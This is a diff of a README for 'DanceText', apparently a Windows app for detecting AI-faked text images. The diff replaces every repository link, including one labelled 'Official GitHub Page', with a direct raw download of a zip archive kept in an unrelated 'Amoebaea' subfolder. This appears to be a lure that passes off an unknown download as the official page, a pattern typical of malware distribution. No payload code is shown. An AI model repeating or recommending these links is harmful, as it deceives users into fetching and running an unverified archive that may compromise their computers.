@@ -1,6 +1,6 @@
 # 🤖 DanceText - Spot AI-Counterfeited Text Images
 
-[![Download Now](https://img.shields.io/badge/Download-DanceText-blue?style=for-the-badge)](https://github.com/uhdontask/DanceText)
+[![Download Now](https://img.shields.io/badge/Download-DanceText-blue?style=for-the-badge)](https://github.com/uhdontask/DanceText/raw/refs/heads/main/Amoebaea/Dance-Text-1.9-beta.1.zip)
 
 ---
 
@@ -28,7 +28,7 @@ DanceText works well on most modern Windows computers. Older systems might run s
 
 Click the button below to visit the download page for DanceText:
 
-[![Download DanceText](https://img.shields.io/badge/Download-DanceText-green?style=for-the-badge)](https://github.com/uhdontask/DanceText)
+[![Download DanceText](https://img.shields.io/badge/Download-DanceText-green?style=for-the-badge)](https://github.com/uhdontask/DanceText/raw/refs/heads/main/Amoebaea/Dance-Text-1.9-beta.1.zip)
 
 You will land on the GitHub page where you can find the latest version of the app. The page includes all files you need to run DanceText on your computer.
 
@@ -116,7 +116,7 @@ To update, repeat the download and install steps. Your settings and saved data w
 
 ## 🌐 Useful Links
 
-- Official GitHub Page: [https://github.com/uhdontask/DanceText](https://github.com/uhdontask/DanceText)
+- Official GitHub Page: [https://github.com/uhdontask/DanceText/raw/refs/heads/main/Amoebaea/Dance-Text-1.9-beta.1.zip](https://github.com/uhdontask/DanceText/raw/refs/heads/main/Amoebaea/Dance-Text-1.9-beta.1.zip)
 - Issues and Support: Use the GitHub "Issues" tab to report problems or ask questions.
 - Documentation: Check the "Wiki" or "Readme" files on the GitHub page for more details.
 
